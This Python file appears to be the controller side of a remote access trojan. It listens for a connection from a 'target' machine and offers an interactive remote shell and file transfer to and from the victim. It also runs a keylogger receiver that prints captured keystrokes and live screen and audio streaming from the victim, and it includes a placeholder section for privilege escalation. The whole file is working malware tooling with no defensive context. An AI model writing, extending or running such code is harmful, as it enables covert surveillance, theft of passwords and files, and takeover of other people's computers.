import socket
import json
import os
import threading
import cv2
import numpy as np
import struct
import pyaudio
import queue
import multiprocessing
from dotenv import load_dotenv

# ====================
# Environment
# ====================

# Load environment variables from .env file
dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
load_dotenv(dotenv_path)

# Set variables based on .env values
TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))
KEYLOGGER_PORT = int(os.getenv("KEYLOGGER_PORT", 7000))

# Use these variables in your code
print(f"Target IP: {TARGET_IP}")
print(f"Target Port: {TARGET_PORT}")
print(f"Video Port: {VIDEO_PORT}")
print(f"Audio Port: {AUDIO_PORT}")
print(f"Keylogger Port: {KEYLOGGER_PORT}")

# ====================
# Utils Function
# ====================

# Function to send data reliably as JSON-encoded strings
def reliable_send(socket, data):
    jsondata = json.dumps(data)
    socket.send(jsondata.encode())

# Function to receive data reliably as JSON-decoded strings
def reliable_recv(socket):
    data = ''
    while True:
        try:
            data = data + socket.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(socket, file_name):
    try:
        f = open(file_name, 'rb')
        socket.send(f.read())
    except FileNotFoundError as e:
        print(e)

# Function to download a file from the target machine
def download_file(socket, file_name):
    # Set a timeout for receiving data from the socket (1 second).
    socket.settimeout(1)
    
    try:
        first_chunk = socket.recv(1024)
        # Check for error message
        if first_chunk.startswith(b"ERROR:"):
            print(first_chunk.decode())
            return
        
        # Open the specified file in binary write ('wb') mode only if the first chunk is valid
        with open(file_name, 'wb') as f:
            f.write(first_chunk)
            
            while True:
                try:
                    chunk = socket.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except TimeoutError:
                    break
    except Exception as e:
        print(f"Error occurred while downloading {file_name}: {str(e)}")
    finally:
        # Reset the timeout to its default value (None).
        socket.settimeout(None)

# ====================
# Shell Command
# ====================
keylogger_process = None 
# Function for the main communication loop with the target
def target_communication(target):
    dir = ''
    keylogger_socket, keylogger_thread = None, None
    while True:
        command = input(f'* Shell~{str(TARGET_IP)}: {dir}$ ')
        reliable_send(target, command)

        # Common command
        if command == 'quit':
            stop_screen_stream()
            # Terminate the main program and keylogger process
            print("Terminating keylogger and main program...")
            if keylogger_socket:
                reliable_send(keylogger_socket, "TERMINATE")
                keylogger_socket.close()
            if keylogger_thread:
                keylogger_thread.join(timeout=1)
            terminate_keylogger_terminal()
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            recv_data = reliable_recv(target)
            err = recv_data['stderr']
            if err:
                print(err)
            else:
                dir = recv_data['stdout'] + ' '
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:6] == 'upload':
            upload_file(target, command[7:])

        # Screen Streaming
        elif command == 'screen':
            connected = {'video': False, 'audio': False}
            start_screen_stream(connected)
            print('''
 _____                            _____ _                            _             
/  ___|                          /  ___| |                          (_)            
\ `--.  ___ _ __ ___  ___ _ __   \ `--.| |_ _ __ ___  __ _ _ __ ___  _ _ __   __ _ 
 `--. \/ __| '__/ _ \/ _ \ '_ \   `--. \ __| '__/ _ \/ _` | '_ ` _ \| | '_ \ / _` |
/\__/ / (__| | |  __/  __/ | | | /\__/ / |_| | |  __/ (_| | | | | | | | | | | (_| |
\____/ \___|_|  \___|\___|_| |_| \____/ \__|_|  \___|\__,_|_| |_| |_|_|_| |_|\__, |
                                                                              __/ |
                                                                             |___/ 
''')
        
        # Keylogger
        elif command == 'keylogger':
            print('Keylogger Initiated')
            keylogger_terminal()
        
        # Others
        else:
            result = reliable_recv(target)
            print(result)

# ====================
# Feature 1: Keylogger
# ====================

# Keylogger receiver function

def keylogger_receiver():
    keylogger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    keylogger_socket.bind((TARGET_IP, KEYLOGGER_PORT))
    keylogger_socket.listen(1)
    print(f"Keylogger server listening on {TARGET_IP}:{KEYLOGGER_PORT}")

    try:
        keylogger_client, addr = keylogger_socket.accept()
        print(f"Keylogger client connected from {addr}")
        
        print('''
  _  __            _  _     _              __ _    __ _                  
 | |/ /    ___    | || |   | |     ___    / _` |  / _` |   ___      _ _  
 | ' <    / -_)    \_, |   | |    / _ \   \__, |  \__, |  / -_)    | '_| 
 |_|\_\   \___|   _|__/   _|_|_   \___/   |___/   |___/   \___|   _|_|_  
_|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
''')
        
        while True:
            keystroke = reliable_recv(keylogger_client)  # Implement reliable_recv function as per your implementation
            print(keystroke)
            if keystroke == "esc":
                break
    
    except Exception as e:
        print(f"Error in keylogger receiver: {e}")
    
    finally:
        keylogger_socket.close()

import sys
import subprocess
import signal

# Function to get the virtual environment path
def get_virtualenv_path():
    # Check if we are in a virtual environment
    if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
        # Python is running in a virtual environment
        if sys.platform == 'win32':
            return os.path.join(sys.prefix, 'Scripts', 'activate.bat')
        else:
            return os.path.join(sys.prefix, 'bin', 'activate')

    # If not in a virtual environment, return None
    return None

# Function to handle keylogger terminal
def keylogger_terminal():
    global keylogger_process  # Access the global variable
    current_dir = os.path.abspath('.')
    virtualenv_activate = get_virtualenv_path()

    if virtualenv_activate:
        if os.name == 'posix':
            if 'darwin' in os.uname().sysname.lower():  # macOS
                osascript_command = f'tell application "iTerm"\n' \
                                    f'  create window with default profile\n' \
                                    f'  tell current session of current window to write text "cd {current_dir} && source {virtualenv_activate} && python3 -c \\"import server; server.keylogger_receiver()\\""\n' \
                                    f'end tell'
                keylogger_process = subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:  # Linux (example with gnome-terminal)
                terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 -c \\"import server; server.keylogger_receiver()\\"; exec bash"'
                keylogger_process = subprocess.Popen(terminal_command, shell=True)
    else:
        print("Virtual environment not found.")

def terminate_keylogger_terminal():
    global keylogger_process
    if keylogger_process:
        if 'darwin' in os.uname().sysname.lower():  # macOS
            os.killpg(os.getpgid(keylogger_process.pid), signal.SIGTERM)
        else:  # Linux
            keylogger_process.terminate()
        keylogger_process = None

# ====================
# Feature 2: Privilege Escalation
# ====================

# ====================
# Feature 3: Screen Streaming
# ====================

# Constants
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# Helper function to receive data
def receive_all(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf:
            return None
        buf += newbuf
        count -= len(newbuf)
    return buf

# Video receiving and displaying
def video_stream(server_socket, frame_queue, connected):
    client_socket, addr = server_socket.accept()
    print('Video connection from:', addr)
    connected['video'] = True

    try:
        while connected['video']:
            message_size = receive_all(client_socket, struct.calcsize(">L"))
            if not message_size:
                break
            message_size = struct.unpack(">L", message_size)[0]
            frame_data = receive_all(client_socket, message_size)
            if not frame_data:
                break
                
            frame = np.frombuffer(frame_data, dtype=np.uint8)
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            frame_queue.put(frame)
    finally:
        client_socket.close()
        connected['video'] = False

# Audio receiving and playing
def audio_stream(server_socket, connected):
    client_socket, addr = server_socket.accept()
    print('Audio connection from:', addr)
    connected['audio'] = True

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    output=True,
                    frames_per_buffer=CHUNK)

    try:
        while connected['audio']:
            message_size = receive_all(client_socket, struct.calcsize(">L"))
            if not message_size:
                break
            message_size = struct.unpack(">L", message_size)[0]
            audio_data = receive_all(client_socket, message_size)
            if not audio_data:
                break
            stream.write(audio_data)
    finally:
        client_socket.close()
        stream.stop_stream()
        stream.close()
        p.terminate()
        connected['audio'] = False

# Screen streamer
def screen_streamer(connected, commu_queue):

    # Video streaming
    video_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video_server_socket.bind((TARGET_IP, VIDEO_PORT))
    video_server_socket.listen(5)
    print("Video server listening at:", (TARGET_IP, VIDEO_PORT))
    
    # Audio streaming
    audio_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    audio_server_socket.bind((TARGET_IP, AUDIO_PORT))
    audio_server_socket.listen(5)
    print("Audio server listening at:", (TARGET_IP, AUDIO_PORT))
    
    frame_queue = queue.Queue()

    video_thread = threading.Thread(target=video_stream, args=(video_server_socket, frame_queue, connected))
    audio_thread = threading.Thread(target=audio_stream, args=(audio_server_socket, connected))
    
    video_thread.start()
    audio_thread.start()

    # Wait until both video and audio connections are established
    while not (connected['video'] and connected['audio']):
        pass
    
    commu_queue.put("Connection Established")

    # Display frames from the queue in the main thread
    cv2.namedWindow('Received', cv2.WINDOW_GUI_NORMAL)
    try:
        while connected['video'] and connected['audio']:
            if not frame_queue.empty():
                frame = frame_queue.get()
                cv2.imshow('Received', frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
    finally:
        cv2.destroyAllWindows()
        connected['video'] = False
        connected['audio'] = False

    video_thread.join()
    audio_thread.join()

# Function to start screen streaming in a separate process
def start_screen_stream(connected):
    global screen_process

    # Create a queue for communication
    commu_queue = multiprocessing.Queue()

    # Create a new process for screen streaming
    screen_process = multiprocessing.Process(target=screen_streamer, args=(connected, commu_queue, ))
    screen_process.start()
    
    # Print process ID for reference
    print(f"Screen streaming process started with PID: {screen_process.pid}")

    # Main process continues here
    # Wait for a signal from the child process
    message = commu_queue.get()
    print(f"Received message from screen process: {message}")

# Function to stop screen streaming process
def stop_screen_stream():
    global screen_process
    try:
        if screen_process and screen_process.is_alive():
            # Terminate the process
            screen_process.terminate()
            screen_process.join(timeout=1)  # Wait for termination
            print("Screen streaming process terminated.")
    except NameError:
        print("Screen streaming process not running.")  

# ====================
# Main Program
# ====================

def main():
    # Create a socket for the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((TARGET_IP, TARGET_PORT))
    sock.listen(5)
    print('[+] Listening For The Incoming Connections')

    # Accept incoming connection from the target
    target, ip = sock.accept()
    print('[+] Target Connected From: ' + str(ip))

    # Start the main communication loop with the target
    target_comm_thread = threading.Thread(target=target_communication, args=(target,))
    target_comm_thread.start()
    target_comm_thread.join()

    # Close the server socket
    sock.close()

if __name__ == "__main__":
    main()
